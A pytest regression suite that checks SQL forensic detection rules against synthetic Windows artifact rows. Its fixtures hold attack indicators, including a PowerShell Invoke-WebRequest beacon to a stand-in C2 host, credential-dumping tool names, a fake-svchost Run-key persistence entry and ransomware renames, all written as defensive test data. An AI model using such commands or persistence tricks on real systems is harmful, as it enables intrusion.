"""Regression tests for the vendored custom forensic rules.

These run each rule's SQL (verbatim from rules/built/custom.sql.jsonl, the
shipped source of truth) against a synthetic unified_events fixture and assert
the exact set of matched audit_ids. Each rule has POSITIVE rows it must catch
AND negative / known-false-positive rows it must NOT catch — the negatives pin
the anti-overfitting behaviour (e.g. OneDrive must not trip the Run-key rule,
eventbeacons.dat must not trip the hacktool-self-deletion rule) so a future
tweak that broadens a rule and reintroduces a false positive fails loudly.
"""

from __future__ import annotations

import json
import pathlib

import pytest

duckdb = pytest.importorskip("duckdb")

REPO = pathlib.Path(__file__).resolve().parents[2]
RULES_JSONL = REPO / "rules" / "built" / "custom.sql.jsonl"
CASE = "CASE-FIXTURE"

# (audit_id, artifact_id, payload) — one synthetic unified_event per row.
FIXTURE = [
    # --- usn_journal: ransomware .locked ---
    ("locked_pos_rename", "usn_journal",
     {"Name": "sales.xlsx.locked", "Extension": ".locked", "UpdateReasons": "RenameNewName|Close"}),
    ("locked_pos_note", "usn_journal",
     {"Name": "README_RESTORE.txt", "Extension": ".txt", "UpdateReasons": "FileCreate|Close"}),
    ("locked_neg_create", "usn_journal",  # .locked but only created, not renamed
     {"Name": "cache.locked", "Extension": ".locked", "UpdateReasons": "FileCreate|Close"}),
    ("locked_neg_normal", "usn_journal",
     {"Name": "report.docx", "Extension": ".docx", "UpdateReasons": "RenameNewName|Close"}),
    # --- usn_journal: double-extension LNK ---
    ("lnk_pos", "usn_journal",
     {"Name": "invoice_2026Q1.pdf.lnk", "Extension": ".lnk", "UpdateReasons": "FileCreate"}),
    ("lnk_neg_single", "usn_journal",
     {"Name": "shortcut.lnk", "Extension": ".lnk", "UpdateReasons": "FileCreate"}),
    ("lnk_neg_doc", "usn_journal",
     {"Name": "invoice.pdf", "Extension": ".pdf", "UpdateReasons": "FileCreate"}),
    # --- usn_journal: hacktool self-deletion ---
    ("tool_pos_procdump", "usn_journal",
     {"Name": "procdump64.exe", "Extension": ".exe", "UpdateReasons": "FileDelete|Close"}),
    ("tool_pos_mimi", "usn_journal",
     {"Name": "mimi.exe", "Extension": ".exe", "UpdateReasons": "FileDelete|Close"}),
    ("tool_fp_beacon", "usn_journal",  # known FP that an over-broad `beacon` rule caught
     {"Name": "eventbeacons.dat", "Extension": ".dat", "UpdateReasons": "FileDelete|Close"}),
    ("tool_fp_payloadjson", "usn_journal",  # known FP for an over-broad `payload` rule
     {"Name": "SubmissionPayload.json", "Extension": ".json", "UpdateReasons": "FileDelete|Close"}),
    ("tool_neg_create", "usn_journal",  # offensive tool but created, not deleted
     {"Name": "procdump64.exe", "Extension": ".exe", "UpdateReasons": "FileCreate|Close"}),
    # --- registry: Run-key masquerade ---
    ("runkey_pos", "registry",
     {"KeyPath": r"...\CurrentVersion\Run", "ValueName": "Evil",
      "ValueData": r"C:\Users\u\AppData\Roaming\sysupdate\svchost.exe"}),
    ("runkey_fp_windows", "registry",  # svchost but legitimately under \Windows\
     {"KeyPath": r"...\CurrentVersion\Run", "ValueName": "Sys",
      "ValueData": r"C:\Windows\System32\svchost.exe -k netsvcs"}),
    ("runkey_fp_onedrive", "registry",  # AppData but not a system-process name
     {"KeyPath": r"...\CurrentVersion\Run", "ValueName": "OneDrive",
      "ValueData": r"C:\Users\u\AppData\Local\Microsoft\OneDrive\OneDrive.exe /background"}),
    ("runkey_neg_notrun", "registry",  # system-proc name in AppData but not a Run key
     {"KeyPath": r"...\CurrentVersion\Policies", "ValueName": "X",
      "ValueData": r"C:\Users\u\AppData\Roaming\svchost.exe"}),
    # --- shellbags: admin-share access ---
    ("share_pos", "shellbags",
     {"Value": r"\\127.0.0.1\c$", "AbsolutePath": r"Desktop\Computers and Devices\127.0.0.1\127.0.0.1\c$"}),
    ("share_neg_local", "shellbags",
     {"Value": r"C:\Users\u\Documents", "AbsolutePath": r"Desktop\Documents"}),
    ("share_neg_normalshare", "shellbags",
     {"Value": r"\\fileserver\public", "AbsolutePath": r"Desktop\public"}),
    # --- amcache: executable from a world-writable path ---
    ("exec_pos_public", "amcache",
     {"FullPath": r"c:\users\public\procdump64.exe", "Name": "procdump64.exe",
      "FileExtension": ".exe", "IsOsComponent": "False"}),
    ("exec_neg_progfiles", "amcache",  # 'public' substring but under Program Files
     {"FullPath": r"c:\program files\app\publicize.exe", "Name": "publicize.exe",
      "FileExtension": ".exe", "IsOsComponent": "False"}),
    ("exec_neg_roaming", "amcache",  # AppData\Roaming dev tool is not in the watched set
     {"FullPath": r"c:\users\u\appdata\roaming\npm\node_modules\claude.exe",
      "Name": "claude.exe", "FileExtension": ".exe", "IsOsComponent": "False"}),
    ("exec_neg_nonexe", "amcache",  # in Public but not an executable extension
     {"FullPath": r"c:\users\public\notes.txt", "Name": "notes.txt",
      "FileExtension": ".txt", "IsOsComponent": "False"}),
    # --- evtx PowerShell: C2 attempt to a reserved/sinkhole TLD ---
    ("psc2_pos", "evtx",
     {"Channel": "Microsoft-Windows-PowerShell/Operational", "EventId": "4104",
      "ScriptBlockText": "Invoke-WebRequest -Uri http://evil-c2.attacker.test/beacon -UseBasicParsing"}),
    ("psc2_neg_nocmdlet", "evtx",  # PowerShell + reserved TLD but no network cmdlet
     {"Channel": "Microsoft-Windows-PowerShell/Operational", "EventId": "4104",
      "ScriptBlockText": "Write-Host 'connecting to api.attacker.test'"}),
    ("psc2_neg_legitdomain", "evtx",  # network cmdlet but to a real domain (not reserved TLD)
     {"Channel": "Microsoft-Windows-PowerShell/Operational", "EventId": "4104",
      "ScriptBlockText": "Invoke-WebRequest -Uri https://github.com/foo -OutFile bar"}),
    ("psc2_neg_notps", "evtx",  # cmdlet + reserved TLD but not the PowerShell channel
     {"Channel": "Security", "EventId": "4688",
      "ScriptBlockText": "Invoke-WebRequest http://evil-c2.attacker.test/x"}),
]

EXPECTED = {
    "tlvb-powershell-c2-reserved-tld": {"psc2_pos"},
    "tlvb-exec-from-world-writable-path": {"exec_pos_public"},
    "tlvb-ransomware-locked-mass-rename": {"locked_pos_rename", "locked_pos_note"},
    "tlvb-lnk-double-extension-masquerade": {"lnk_pos"},
    "tlvb-hacktool-self-deletion": {"tool_pos_procdump", "tool_pos_mimi"},
    "tlvb-run-key-system-process-masquerade": {"runkey_pos"},
    "tlvb-admin-share-access-shellbags": {"share_pos"},
}


def _load_rules():
    return [json.loads(line) for line in RULES_JSONL.read_text().splitlines() if line.strip()]


@pytest.fixture()
def con():
    c = duckdb.connect(":memory:")
    c.execute(
        """CREATE TABLE unified_events (
             case_id VARCHAR, evidence_id VARCHAR, artifact_id VARCHAR,
             audit_id VARCHAR, ts_utc TIMESTAMP, event_type VARCHAR,
             computer VARCHAR, payload_json VARCHAR)"""
    )
    c.executemany(
        "INSERT INTO unified_events VALUES (?,?,?,?,?,?,?,?)",
        [(CASE, "EV", art, aid, None, art, None, json.dumps(p, ensure_ascii=False))
         for aid, art, p in FIXTURE],
    )
    # a decoy row in a different case must never match (case_id filter)
    c.execute(
        "INSERT INTO unified_events VALUES (?,?,?,?,?,?,?,?)",
        ["OTHER-CASE", "EV", "usn_journal", "decoy", None, "usn_journal", None,
         json.dumps({"Name": "sales.xlsx.locked", "Extension": ".locked",
                     "UpdateReasons": "RenameNewName"})],
    )
    return c


def test_all_rules_present():
    ids = {r["rule_id"] for r in _load_rules()}
    assert ids == set(EXPECTED), f"rule set drift: {ids ^ set(EXPECTED)}"


@pytest.mark.parametrize("rule", _load_rules(), ids=lambda r: r["rule_id"])
def test_rule_matches_exactly_expected(con, rule):
    rid = rule["rule_id"]
    rows = con.execute(rule["sql"], [CASE]).fetchall()
    matched = {r[0] for r in rows}  # audit_id is the first output column
    assert matched == EXPECTED[rid], (
        f"{rid}: matched {sorted(matched)}, expected {sorted(EXPECTED[rid])}"
    )


@pytest.mark.parametrize("rule", _load_rules(), ids=lambda r: r["rule_id"])
def test_rule_output_contract(rule):
    sql = rule["sql"].lower()
    # Tier 1A runtime contract: single ? placeholder (case_id), SELECT-only.
    assert sql.count("?") == 1, f"{rule['rule_id']}: must have exactly one placeholder"
    assert sql.lstrip().startswith("select")
    for banned in (" insert ", " update ", " delete ", " drop ", "attach", "pragma", ";"):
        assert banned not in sql, f"{rule['rule_id']}: contains {banned!r}"
    assert sql.startswith(
        "select audit_id, ts_utc, artifact_id, event_type"
    ), f"{rule['rule_id']}: output columns must start audit_id, ts_utc, artifact_id, event_type"
